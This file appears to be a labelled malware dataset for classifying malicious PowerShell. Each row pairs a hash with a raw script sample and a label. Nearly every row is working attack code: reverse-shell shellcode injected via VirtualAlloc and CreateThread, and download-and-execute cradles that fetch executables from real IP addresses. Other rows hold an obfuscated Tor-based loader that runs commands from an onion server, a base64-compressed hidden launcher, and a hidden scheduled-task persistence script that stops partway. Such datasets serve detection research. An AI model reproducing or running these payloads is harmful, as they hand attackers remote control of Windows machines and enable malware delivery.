$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x03,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
ae4ee7f881952a5a3e8590e681964d177fc5498984e1bd254f4b65ddb7d4fca4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xd5,0x39,0x2d,0x7d,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
d6ae2962b73f62663bed6a04cfb17e3e0ac963040f9ac1b6c9da6715ec658ff2,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0xa1,0x64,0x0a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
9dbdb5ec7578133a54cd015eb6f4099abd7f5e9bcab2ffb87fc26b5372445f0b,"
'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $by){;'BrOZYLFVY';'ihznknftcRL';(Get-Process -id $pid).Kill();'eMBnBWC';'ClMCvnGz';};'kFqbERjcaK';'cZdefv';function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws = $xyu.NameSpace($bqvt).Items();'DVRZCMXn';'aVMuAymCDo';$xyu.NameSpace($ezpr).CopyHere($ws, 20);'NoYaTMgWV';'WczlafFHI';rd $bqvt;'AJc';'Rl';};'mwPV';'XYS';'bSRkM';'GFeZKeMy';'Vt';'blWvxEYdB';$ezpr = $env:APPDATA + '\' + $by;'HTC';'zgOw';if (!(Test-Path $ezpr)){;'fAXKjau';'kEXx';$vpjq = New-Item -ItemType Directory -Force -Path $ezpr;'GWSbA';'vOvra';$vpjq.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'amPCGy';'EKFM';};'sB';'RRiIYz';'bvcCeTeLW';'NcOTYolCIB';$vtzg=$ezpr+ '\tor.exe';'RoqsuXE';'fQGBWGwt';$ot=$ezpr+ '\polipo.exe';'HXKsRivf';'oynNceOnFxy';$bqvt=$ezpr+'\'+$by+'.zip';'DJlrBBZS';'HlBZ';$ilua=New-Object System.Net.WebClient;'QDcpy';'QJxf';$xyu=New-Object -C Shell.Application;'xeSu';'BEJbU';'BtnJKUSm';'HuG';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'cxjBOmZvDk';'NInn';e 'i.vankin.de';'COYVXPD';'QLikWodWT';};'nlHScK';'tLVWu';'DGZInswj';'ieaqBnXXBL';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'Tga';'rUFQi';e 'gg.ibiz.cc';'LVSqds';'MkiSQLVJy';};'sFUMwRQj';'DZ';'db';'NmVXjZaO';$cvdz=$ezpr+'\roaminglog';'LUPq';'gKQgLmYh';saps $vtzg -Ar "" --Log `""notice file $cvdz`"""" -wi Hidden;'PZxnCI';'soSyFSxz';do{sleep 1;$bimy=gc $cvdz}while(!($bimy -match 'Bootstrapped 100%: Done.'));'MDNhoZxE';'GuMuzoCwT';saps $ot -a ""socksParentProxy=localhost:9050"" -wi Hidden;'cfrwPc';'DlnzyvwBYQ';sleep 7;'TAtSCy';'NgTi';$qdax=New-Object System.Net.WebProxy(""localhost:8123"");'Axpk';'yYePww';$qdax.useDefaultCredentials = $true;'KcqLHXXNxQs';'mBUkNfwsfiX';$ilua.proxy=$qdax;'NnVlUajch';'tgizAGRCEXq';$pbtx='http://powerwormjqj42hu.onion/get.php?s=setup&mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&uid=' + $by;'zl';'rIIvBbyFn';while(!$nrcb){$nrcb=$ilua.downloadString($pbtx)};'VWM';'UAqS';if ($nrcb -ne 'none'){;'yyeYfmxpss';'eT';iex $nrcb;'oD';'JqEesDpgbI';};'YsGjzbNbhIw';

",TaskExecution
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
049883df901d9bee787005a86aacb816cd8b669cb900d735ca284779bdcdd983,"
$wc=New-OBjeCT SyStEM.NEt.WEBClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEADeRS.ADD('User-Agent',$u);$wc.PRoXY = [SysTEm.Net.WebREQUeSt]::DefAuLtWeBPrOxY;$wc.PRoxy.CrEDeNTialS = [SysTem.NET.CreDEntiAlCAChe]::DEfaULtNetWORkCrEdENTIaLS;$K='F]o)SLi!.9e^MAtk+p*:37x{-Hd8&IQh';$I=0;[cHAR[]]$B=([cHAR[]]($wc.DOWNloadStRing(""http://192.168.59.131:80/index.asp"")))|%{$_-bXOR$K[$I++%$K.LENGtH]};IEX ($b-join'')

",Payload
2061d98b6bb4f490a28cddec9454ee80bafe0a669fde6c44a8ae3262e3d0fb19,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
77b1b5f35bb8684c7807f25a377164c84722cb175a04ae0336414b0648463479,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADWiTlgCA7VWa2/aSBT9nEr9D1aFhK0SDIQ0TaRKO+ZlwiMQB/MqWk3ssRkYPGQ8JkDb/77XgBOyTXbbldYCeR73zpw599y59qLAkZQHipy718q39+9OOljghaKm/CY//0QH3Z6/XGWU1CIwzcv15lw7OQGjFHeat6SxbitfFHWMlssyX2AaTK6uSpEQJJD7frZGJApDsrhnlISqpnxX+lMiyOnN/Yw4UvmmpP7M1hi/x+xgtilhZ0qUUxS48VyTOziGl7WWjEo1/fVrWhuf5ifZykOEWaimrU0oySLrMpbWlB9avOHdZknUdIs6gofck9k+Dc4K2V4QYo+0YbUVaRE55W6Y1uAk8BNERiJQns4UL7I3UdPQ7AjuINcVJASPbD1Y8TlRU0HEWEb5Qx0fENxGgaQLAvOSCL60iFhRh4RZEwcuI7fEm6ht8pgc/Fed1GMnsOpIoWUgOG9AbXE3YmTvndZ+BvsiqBo8x4EFNn68f/f+nZdIAks+O5YEtE7GuzYBuGqHh3Rn90XJZZQWbAoOYgPd1J2IiDZRxnEoxpOJkgrwAy5k3l4gn1jHtqP+gykDCcNjm1N3Am6HSKVW1YHJRFS7dux4+m3hlYlHA1LeBHhBnURb6mshIB4ju/NmE7M24FPThwnilgkjPpYxoRll/LNbZUHlk68RUeYSgRwIYwioIMLaSzD7GKnpetAiC+Br309DJDxQNEmsDyreJLvHfTBKlxgOw4zSiSClnIxiEcyIm1FQENLDFIok3zXTz3BbEZPUwaFMlptof6PzsG2JB6EUkQORBArurCVxKGYxIxnFpC4xNhb1k+3Tr/JRwozRwIeVVhAPGIl5sGSsDwFI91rQshaR9cWSkQUY7XK8yrAPGX3IiZ2isE/c9BtIE9nvNR5Tk3ByhBPibTEuM4pNhYQbI6Y50dd/hHJ0YRyDKglyiJKaJNLY2MhY/ikX8e72JtcN4+RIGNvxIyRwUxV8YeCQfCpaUgBz6gf9hpYQPMN6wFqOMad59Ejz9Rb8e/SszssXbuN6ZuqivJ56qB7WW2an3DXN4urasovSqtRlo1OXrcpgNrOQedsbylEdmXc0Nx8Wt8trurWayB2u9U9bY/uYM9bbme96w7Ln+ReedZs/r9Jmv9Q1cgXcLFeiZt94NHLFsEIfzS7tdefXVXk/tBnuebo/yF9ium6KmZ3nrW0dodr0zNlee3Zt2nI3Q1O/7BfnqIJQKajYVYM3hoZAHd3Gvs0fG77IFXw4awNTMur2qka3WzVQrzZ7KF/qPvgO8NTo2wU6Wg5up9CvAoSGnivWXbLlwy6QVOMI+7dg45cKztQDm/JHZHxs87CA5wZHBthURw+Aa7isdhjM3/UKHNmsPcCoOdpUdT0/7BSRmaP9mo/iJbFvdDEKV+VtWc/bLnf75+2hp9sDdqGXS3dLx9N1/dEsN5xRfv355uJzs0/tBUc9Xbc/xCIBlaToQ51tL+qEONboKO5v3fktLMIpZqAHuMiTNK1yUT1cxx1OYw9V3VXqOREBYVDXoPIl4kaMcScuD7uLG0rTvmBMIEt70DwrvNrSlCdD7blkJENXVyNACanyrOFskwS+nGZy67NcDm7+3LqYgzP/+vlKfLlRjxbMxPXjBV0v92O7/bQ4pVLizFxuixtU/X8ZPWTzFF7uvzH6PPYPs7/Eci7zkoWfpl8O/Bbpv01BH1MJlhZcSIzsa+brTBxkdPS58RQk0Ih3eOJvv5tInrbhU+Qvbkz+0nUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
d092561ccf6ae47795c2a61e152eed35905df18e48582637006cd77b9972fbef,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x64,0x68,0x02,0x00,0x07,0xe4,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
4afbe15a7453deb54b263466abdb0b3978eec9bc68bb48f2c6f02104b1dd4e6b,"
(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'

",Payload
b885c3bbe525172c0ffff26464993e55a0341ab4209ce09789180c3ba07c4255,"
$TaskName = ""Microsoft Windows Driver Update""
$TaskDescr = ""Microsoft Windows Driver Update Services""
$TaskCommand = ""C:\ProgramData\WindowsUpgrade\evil.exe""
$TaskScript = """"
$TaskArg = """"
$TaskStartTime = [datetime]::Now.AddMinutes(1) 
$service = new-object -ComObject(""Schedule.Service"")
$service.Connect()
$rootFolder = $service.GetFolder(""\"")
$TaskDefinition = $service.NewTask(0) 
$TaskDefinition.RegistrationInfo.Description = ""$TaskDescr""
$TaskDefinition.Settings.Enabled = $true
$TaskDefinition.Settings.Hidden = $true
$TaskDefinition.Settings.RestartCount = ""5""
$TaskDefinition.Settings.StartWhenAvailable = $true
$TaskDefinition.Settings.StopIfGoingOnBatteries = $false
$TaskDefinition.Settings.RestartInterval = ""PT5M""
$triggers = $TaskDefinition.Triggers
$trigger = $triggers.Create(8)
